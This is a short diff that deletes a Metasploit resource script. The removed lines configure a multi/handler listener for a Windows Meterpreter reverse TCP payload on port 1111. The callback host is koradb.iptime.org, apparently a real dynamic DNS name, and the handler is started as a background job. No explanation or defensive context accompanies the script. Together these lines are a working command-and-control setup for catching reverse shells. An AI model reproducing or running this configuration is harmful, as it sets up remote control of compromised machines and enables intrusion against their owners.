@@ -1,6 +1,0 @@
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LPORT 1111
-set LHOST koradb.iptime.org
-exploit -j -z
-setg DisablePayloadHandler 1
